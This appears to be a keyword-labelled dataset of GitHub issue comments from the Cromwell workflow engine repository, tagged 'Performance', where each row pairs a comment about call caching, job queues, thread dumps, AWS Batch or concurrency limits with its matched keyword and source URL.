lookups.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2360#issuecomment-308687081:1047,cache,cache,1047,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2360#issuecomment-308687081,1,['cache'],['cache']
Performance,"Due to the activity noise, the comments are hidden, I'll post here for better visibility. > Request grouping. Originally, this was created because we hoped that Google had an alternative to Batch requests, by now, Google has confirmed that there is no way to do that. These are some notes from our internal discussions:; 1. The code becomes way simpler if this grouping gets removed.; 2. We have not checked the potential implications on creating a batch client for every request, or, reusing the same client for the application's lifecycle.; 3. Grouping requests could allow us to eventually implement streaming like fs2/akka-stream, which could allow us to throttle the requests, still, if Cromwell already does this in another layer, this becomes unnecessary. Given that the current code has been tested so many times, my suggestion is to keep the grouping and potentially remove it in another iteration. > Error codes. Google has confirmed that there are more error codes than what the grpc response provides, still, these can be found at the job events, hence, they need to be parsed from the strings (PAPI does something similar). But, this has not been done in this PR which is why I have removed a lot of code that is not necessary. In a following PR, we should implement part of this in order to handle preemption errors. See https://cloud.google.com/batch/docs/troubleshooting#reserved-exit-codes. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2131570709:659,throttle,throttle,659,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2131570709,1,['throttle'],['throttle']
Performance,"E9455FA72420237EB05902327 | 2018-11-21 15:09:37.710000 | string |; | 4735 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hit | test.hello | NULL | 1 | true | 2018-11-21 15:09:09.839000 | boolean |; | 4742 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hit | test.hello | NULL | 1 | false | 2018-11-21 15:09:10.555000 | boolean |; | 4741 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hitFailures[0]:2f58eee9-1b0f-4436-a4ad-48eb305655e9\:test.hello\:-1[2043552529]:causedBy[0]:causedBy[] | test.hello | NULL | 1 | NULL | 2018-11-21 15:09:10.486000 | NULL |; | 4740 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hitFailures[0]:2f58eee9-1b0f-4436-a4ad-48eb305655e9\:test.hello\:-1[2043552529]:causedBy[0]:message | test.hello | NULL | 1 | The specified key does not exist. (Service: S3Client; Status Code: 404; Request ID: 677F4FE44C747A7E) | 2018-11-21 15:09:10.486000 | string |; | 4739 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hitFailures[0]:2f58eee9-1b0f-4436-a4ad-48eb305655e9\:test.hello\:-1[2043552529]:message | test.hello | NULL | 1 | [Attempted 1 time(s)] - NoSuchKeyException: The specified key does not exist. (Service: S3Client; Status Code: 404; Request ID: 677F4FE44C747A7E) | 2018-11-21 15:09:10.485000 | string |; | 4736 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:result | test.hello | NULL | 1 | Cache Hit: 2f58eee9-1b0f-4436-a4ad-48eb305655e9:test.hello:-1 | 2018-11-21 15:09:09.839000 | string |; | 4743 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:result | test.hello | NULL | 1 | Cache Miss | 2018-11-21 15:09:10.555000 | string |; | 4759 | 02306258-436a-4372-ab54-2dcd83c42b47 | callRoot | test.hello | NULL | 1 | s3://s4-somaticgenomicsrd-valinor/cromwell-execution/test/02306258-436a-4372-ab54-2dcd83c42b47/call-hello | 2018-11-21 15:09:10.588000 | string |; | 4762 | 02306258-436a-4372-ab54-2dcd83c42b47 | commandLine | test.hello | NULL | 1 | echo 'Hello World!' > ""helloWorld.txt"" | 2018-11-21 15:09:10.767000 | string |",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440701029:1713,Cache,Cache,1713,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440701029,2,['Cache'],['Cache']
Performance,"Excellent point from @cjllanwarne: we are protected from the ""workshop scenario"" - many users validating the same WF at the same time - by the Rawls cache",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456958477:149,cache,cache,149,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456958477,1,['cache'],['cache']
Performance,"Excellent! Thanks for the pointer. As far as compute environment and job queue, they need to be setup in advance. @delagoya is creating a CloudFormation template that will make this relatively simple, and I believe we're planning on putting that in the 101 docs at that time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395554332:73,queue,queue,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395554332,1,['queue'],['queue']
Performance,Exception: Unable to create actor for ActorRef Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/ServiceRegistryActor/KeyValue#988818050]; at cromwell.server.CromwellRootActor$$anonfun$1.applyOrElse(CromwellRootActor.scala:81); at cromwell.server.CromwellRootActor$$anonfun$1.applyOrElse(CromwellRootActor.scala:80); at akka.actor.SupervisorStrategy.handleFailure(FaultHandling.scala:295); at akka.actor.dungeon.FaultHandling$class.handleFailure(FaultHandling.scala:263); at akka.actor.ActorCell.handleFailure(ActorCell.scala:374); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:459); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.reflect.InvocationTargetException; at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45); at java.lang.reflect.Constructor.newInstance(Constructor.java:423); at akka.util.Reflect$.instantiate(Reflect.scala:65); at akka.actor.ArgsReflectConstructor.produce(IndirectActorProducer.scala:96); at akka.actor.Props.newActor(Props.scala:213); at akka.actor.ActorCell.newActor(ActorCell.scala:562); at akka.actor.ActorCell.create(ActorCell.scala:588); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:461); ... 8 more; Caused by: java.lang.ExceptionInInitializerError; at cromwell.services.SingletonServicesStore$cl,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1748#issuecomment-265155974:1333,concurren,concurrent,1333,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1748#issuecomment-265155974,1,['concurren'],['concurrent']
Performance,"Executor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b76aed8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.Lo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:2985,concurren,concurrent,2985,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"Executor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #94 prio=5 os_prio=0 tid=0x00007fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""Fo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:2108,concurren,concurrent,2108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"FWIW Enum support would definitely be very valuable to us in GATK-world, and are likely to be useful in general. . My one caveat would be that they should be easier to work with than they were in Queue (friendly elbow poke at @kshakir).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2425#issuecomment-325877126:196,Queue,Queue,196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2425#issuecomment-325877126,1,['Queue'],['Queue']
Performance,"FWIW this was inspired by the conversation here: (https://gatkforums.broadinstitute.org/wdl/discussion/9031/intermediate-outputs#latest). In particular I wonder whether this might maybe help with the unfortunate interaction of ""intermediate files"" and ""call caching"". In particular it gives users something a bit bigger than a task to call cache against, so there are more options, eg; * delete all intermediates (and never call cache); * delete job outputs (but maybe I can still cache subworkflows that haven't changed); * delete no intermediates (and call cache at the finest grain)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3420#issuecomment-373493373:340,cache,cache,340,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3420#issuecomment-373493373,4,['cache'],['cache']
Performance,"FYI there's a hidden watermark at the top of the file that one can use in PRs to tell if the RESTAPI.md was manually or automatically updated. Example: https://github.com/broadinstitute/cromwell/blame/31/docs/api/RESTAPI.md#L1-L8. Also if one doesn't have a dev environment locally they can still use any public sbt docker. It will take a while as it downloads ~the entire internet~ all of the un-cached cromwell dependencies, but something like this will work:. ```shell; docker \; run \; --rm \; -v $PWD:$PWD \; -w $PWD \; hseeberger/scala-sbt \; sbt generateRestApiDocs; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3562#issuecomment-385389043:397,cache,cached,397,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3562#issuecomment-385389043,1,['cache'],['cached']
Performance,"Figured out the issue thanks to @cjllanwarne as I actually needed to run the following instead:; ```; wget https://raw.githubusercontent.com/broadinstitute/cromwell/develop/cromwell.example.backends/cromwell.examples.conf; sed -i 's/#default = ""LocalExample""/default = ""LocalExample""/' cromwell.examples.conf; sed -i 's/#concurrent-job-limit = 5/concurrent-job-limit = 5/' cromwell.examples.conf; java -Dconfig.file=cromwell.examples.conf -jar cromwell-51.jar run ...; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5359#issuecomment-649838138:321,concurren,concurrent-job-limit,321,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5359#issuecomment-649838138,2,['concurren'],['concurrent-job-limit']
Performance,"Finally, I found out why the MD5 value contains the file path. I Hope it can help others:. ### The server config:; `check-sibling-md5 : true`; When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash.; So i checked the metadata, i found all of hash with file path records is connecting with md5 task, the task command :; ```; command <<<; md5sum ~{inputfile} > ~{inputfile.md5}; >>>; ```; : ( that is a stupid mistakes, right? ; 1. The `inputfile` is a file with whole path, so the md5 task will generate a hash with path like ""b882eaf8272a52d3eea851d74a6b4aec /path/sample.final.bam"", and write to the file `inputfile.md5`. ; 2. The cromwell server will find the `inputfile` sbling md5 with the name `inputfile.md5`, which contains hash with path. So the callcaching in metadata records it.; 3. The next workflow will not hit cache because the file path are different",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592:915,cache,cache,915,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592,1,['cache'],['cache']
Performance,"Fingerprint just uses 10MB. And you can set it lower if you like. There is a fingerprint-size option. ; Strange that just the fingerprinting alone already gives so much load on the filesystem. . Did you try limiting the threads on your cromwell instance? You can set them like this:; ```; akka {; actor.default-dispatcher.fork-join-executor {; # Number of threads = min(parallelism-factor * cpus, parallelism-max); # Below are the default values set by Akka, uncomment to tune these. #parallelism-factor = 3.0; parallelism-max = 3; }; }; ```; This will limit the amount of threads to 3. So cromwell can only handle 3 files at the same time. That should massively reduce the load on your filestorage server.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040396102:169,load,load,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1040396102,3,"['load', 'tune']","['load', 'tune']"
Performance,"First test (@dtenenba built the PR 4412 and I tested it):. Workflow: https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-workflow.wdl; First input json: https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-parameters.json; Second input json: https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-batchofOne.json. and... drumroll please...... IT WORKED!!!!!!!!!!! ; ```; ""callCaching"": {; ""allowResultReuse"": true,; ""hit"": true,; ""result"": ""Cache Hit: 98bc2232-f147-419f-9351-49a07daa1720:Panel_BWA_GATK4_Samtools_Var_Annotate_Split.SamToFastq:0"",; ```; And the workflow is ""generating"" the files WAY faster than it should be if it were doing it de novo, so we seem to be getting the correct outputs moved into the new workflow directory as well. . Caveats: ; I did test it with an actual batch and it failed with the job definition error. But as long as PR 4412 was not intended to fix THAT issue as well, I can say it appears on the first pass that call caching with AWS backend might very well be working with an outside test!!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-480313623:656,Cache,Cache,656,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-480313623,1,['Cache'],['Cache']
Performance,"Fixed the [proof of concept code](https://github.com/broadinstitute/cromwell/compare/develop...rhpvorderman:relativeImports). Now the WOMTOOL is able to handle absolute paths correctly. I can run `java -jar /home/ruben/test/base/womtool-31-1df94fa-SNAP.jar validate /home/ruben/test/base/workflow.wdl ` in any directory on the filesystem and get the same result. However cromwell still uses $PWD to evaluate the base directory. I can see the WOMtool uses the following code to load the WDL file:; ```scala; private[this] def loadWdl(path: String)(f: WdlNamespace => Termination): Termination = {; WdlNamespace.loadUsingPath(Paths.get(path), None, None) match {; case Success(namespace) => f(namespace); case Failure(r: RuntimeException) => throw new RuntimeException(""Unexpected failure mode"", r); case Failure(t) => UnsuccessfulTermination(t.getMessage); }; }; ```; But for cromwell there does not seem to be such a straightforward loading of the wdlfile. Can somebody point me to this?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3241#issuecomment-369579047:477,load,load,477,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3241#issuecomment-369579047,4,['load'],"['load', 'loadUsingPath', 'loadWdl', 'loading']"
Performance,"Fixed! Question: I have a compute-environment, job-queue, and job-definition already set up, and it appears they were used. What would happen if I didn't have any of that set up in AWS Batch already? I don't feel like re-creating right now to test, but just wondering... Also, I see you opened an issue to add volume support. You could check out the work done by the Funnel team and [https://github.com/adamstruck/ebsmount/tree/master/resources/funnel](url)...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395510754:51,queue,queue,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395510754,1,['queue'],['queue']
Performance,"For further clarification. There are two `exec` statements in the config. The `exec` statement **before** the submit command will execute a simple echo command. If singularity notices the image is not there it will pull it to `SINGULARITY_CACHEDIR`. ; Then the job is submitted and the `exec` statement **in** the submit command is executed. If `SINGULARITY_CACHEDIR` is on a shared filesystem the image will already be present. The image will *not* be pulled by the execution node and the job executes right away. Using `exec` instead of `pull` means that Singularity will decide where the image goes, and not the user. This is quite useful as Singularity has all the functionality to make a functional image cache already built-in. This way we don't have to hack it together in bash, which is always the less preferable option.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630879541:710,cache,cache,710,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630879541,1,['cache'],['cache']
Performance,"For the second point, it's already possible, setting the cache-size to 0 will disable the cache here:; https://github.com/broadinstitute/cromwell/blob/develop/core/src/main/resources/reference.conf#L150",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-284004128:57,cache,cache-size,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-284004128,2,['cache'],"['cache', 'cache-size']"
Performance,"For this particular case it might be an optimization, but from a general perspective I think it can be a design choice and would avoid creating new Workflow Actors-like",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195433266:40,optimiz,optimization,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195433266,1,['optimiz'],['optimization']
Performance,"Found the forum entry looking for a solution for mounting a docker volumen. In my case I would like to run Ensembl VEP with Cromwell/WDL. Using VEP in cache/offline mode has many advantages, among them much better performance. When running VEP in cache mode it is necessary to have a large set of files locally installed. Downloading these files using the provided INSTALL.pl will be very inefficient. I plan for now to tar everything together and download and untar from a google bucket every time I run the task. However, it would be much better if I could mount a docker volume to the container running the task. The way I see it I would be able to define an snapshot in the runtime section of the task definition. I would also be able to define the mount point (docker run -v *:{mount point}) where this snapshot would be available as a docker volume. In the background Cromwell would provision a disk using the snapshot, mount it to the VM and use the correct `docker run -v /path/to/disk:/requested/mount/point` docker run command. Hope this helps defining this issue. Thanks for considering raising the priority of this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2190#issuecomment-334726349:151,cache,cache,151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2190#issuecomment-334726349,3,"['cache', 'perform']","['cache', 'performance']"
Performance,"From @droazen . Alright, the commit to use to build the jar to run GenomicsDBImport (using the instructions above) is: d4d97fcbb59efd9acbf8fabca7361b59512755bb. The tool is passing integration tests at this point, and it is completely worth your while to profile the current version and see how it compares to the SelectVariants approach. It's worth mentioning that in the next week or so we will add one additional argument to the tool which might further help performance. You can track the status of this here: https://github.com/broadinstitute/gatk/issues/2613. Hand-off complete -- have a good weekend everyone!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2196#issuecomment-296326007:462,perform,performance,462,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2196#issuecomment-296326007,1,['perform'],['performance']
Performance,"From Gitter:; > we're submitting jobs via API to remote cromwell server, and want to submit workflows with all the imports resolved already (client-side) so that querying cromwell metadata submittedFiles.workflow value shows verbatim what's being executed. Is there a way in wdl4s for example to do something effectively like: `val ns = NamespaceWithWorkflow.load(myWorkflow, myResolver); val wfAsString = ns.toWdlSource` i.e. get the string representation of the workflow back again, but with the imports resolved (""expanded"")?. @cjllanwarne your gist is no longer available, do you remember what you wrote?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2691#issuecomment-335849494:359,load,load,359,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2691#issuecomment-335849494,1,['load'],['load']
Performance,Gave up trying to combat the performance vs memory tradeoff (which seems unlikely to be winnable anyways) and the relatively simple solution works. We can have the metadata write batch size be a config option and tell users that setting the number lower uses less memory but drops performance under higher load and vice versa,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269428855:29,perform,performance,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269428855,3,"['load', 'perform']","['load', 'performance']"
Performance,"Glad that helped !; Regarding HSQL vs MySQL, the main reason is that we've rarely used HSQL and there may be some corner cases that we don't support (and don't know about); It probably performs better too on the long run as your DB grows.; But it's definitely good to have some feedback on how Cromwell behaves with HSQL too.; For the `null` hash, something weird is going on so I'd keep the issue open. If it's not immediately blocking you anymore it might get slightly de-prioritized but we'll definitely look into it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386700970:185,perform,performs,185,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386700970,1,['perform'],['performs']
Performance,"Good news? This would also band-aid the jobs-never-running problem reported last week. From the token logs: . 6:22 PM :; ```; ""queue"" : {; ""groupsNeedingTokens"" : [; {; ""hogGroup"" : ""porcine-project"",; ""size"" : 3367; }; ],; ...; ""poolState"" : {; ""hogGroups"" : [; {; ""hogGroup"" : ""porcine-project"",; ""used"" : 3947,; ""atLimit"" : true; },; ...; ```. At 6:26 PM the `JobExecutionTokenDispenserActor` crashed with a stack trace similar to the one in this PR description. 6:27 PM:. ```; ""tokenTypes"" : [; ""queue"" : {; ""groupsNeedingTokens"" : [; {; ""hogGroup"" : ""porcine-project"",; ""size"" : 5; }; ],; ...; ""poolState"" : {; ""hogGroups"" : [; {; ""hogGroup"" : ""porcine-project"",; ""used"" : 16,; ""atLimit"" : false; }; ],; ...; ```. So the crash of the `JobExecutionTokenDispenserActor` not only lost the token assignments, but also the hog queues. The loss of token assignments leads to the fairly harmless condition of Cromwell handing out more tokens than it actually should (though emitting thousands of scary log messages in the process). But the loss of the hog queues means that the 3367 jobs that needed tokens at 6:22 PM would never receive them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4909#issuecomment-488007667:127,queue,queue,127,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4909#issuecomment-488007667,4,['queue'],"['queue', 'queues']"
Performance,"Good point - that is the load on cromwell server itself; default backend is PBS (very like SGE) but some of the simple tasks in the workflow (`mkdir`, `uuidgen`) specify `backend: ""Local""` in the WDL `runtime` block.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-284748023:25,load,load,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-284748023,1,['load'],['load']
Performance,"Got a chance to look w/ a profiler. Situation definitely *is* improved over previous in that I had to dramatically increase the size of the scatter to get hung up again (this is on my laptop which is apparently way faster than whatever machine @yfarjoun is using). The new bottleneck appears to be ExecutionStore.arePrerequisitesDone, sitting at 99% and growing CPU usage. Specifically the `exists` call in ExecutionStore.isDone and the collect on `key.scope.upstream`. . Note that `isDone` was also the previous hotspot but it doesn't appear to be the FQN calculation any more, rather just the `exists` itself. . It's possible that there's still something we can do a la the FQN here but if not my concern is that this is going to take you into the ""something clever"" realm. BTW @yfarjoun whatever machine you're running this on is also part of your bottleneck. I was able to do a 40k scatter no problem on one of my laptop cores, then just threw in 200k which is what locked it up. If you can't do 1k perhaps retry on something not from the stone age? ;)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277848692:273,bottleneck,bottleneck,273,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277848692,2,['bottleneck'],['bottleneck']
Performance,"Great, thanks. I originally saw this issue when running a 20000-wide Hello World scatter using mock JES. At a point when Cromwell temporarily seemed catatonic, I Control-backslashed and saw loads of engine dispatcher stack traces like the above. Mock JES is currently [broken](#1571) due to batching API changes but hopefully it will become great again soon and the #1456 changes can be validated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1445#issuecomment-254582826:190,load,loads,190,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1445#issuecomment-254582826,1,['load'],['loads']
Performance,"HI @markjschreiber,. Thanks for getting in touch. I had a look at the code and believe I came up with a work around, albeit a bit of a hack. Im building our system in Terraform so have a bit more control over the underlying infrastructure. Im able to mount additional volumes to the underlying ec2 instance, I just needed to mount them inside the container. I managed this with the following runner config:. backend {; default = AWSBatch; providers {; AWSBatch {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; ...; default-runtime-attributes {; queueArn: ""${default_batch_queue}""; scriptBucketName: ""${script_bucket}""; disks: ""local-disk,/bin/bash,${static_ref_snapshot_mount}""; zones: ""${aws_batch_availability_zone}""; }; }; }; }. Specifically `default-runtime-attributes.disks`. The first entry in this list always defaults to the working dir (this is the volume I have set up to autoscale), but after that subsequent values correspond to locations on the host. The only downside is that there is no way to change the mount location in the container. Whatever the location on the host has to be the same location in the container. As I control both I can make sure they are in sync. It feels a bit clunky but seems to be working. I will close this issue but would suggest some minor modifications to the AWS volume handling could really add to the systems flexibility /:-). Best,; Jon",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919472151:591,queue,queueArn,591,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919472151,1,['queue'],['queueArn']
